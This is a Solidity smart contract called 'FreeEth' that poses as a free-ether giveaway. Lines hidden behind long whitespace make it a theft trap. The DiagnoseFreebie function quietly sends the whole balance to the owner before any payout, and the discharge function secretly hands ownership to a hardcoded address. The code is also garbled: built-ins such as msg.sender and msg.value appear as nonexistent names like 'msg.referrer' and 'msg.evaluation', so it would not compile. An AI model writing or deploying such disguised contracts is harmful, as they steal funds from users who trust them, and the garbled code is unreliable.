// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.referrer;

    function() public payable{}

    function DiagnoseFreebie()
    public
    payable
    {
        if(msg.evaluation>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.referrer.transfer(this.balance);
        }
    }

    function discharge()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.referrer==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.referrer == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes record)
    payable
    public
    {
        require(msg.referrer == Owner);
        adr.call.evaluation(msg.evaluation)(record);
    }
}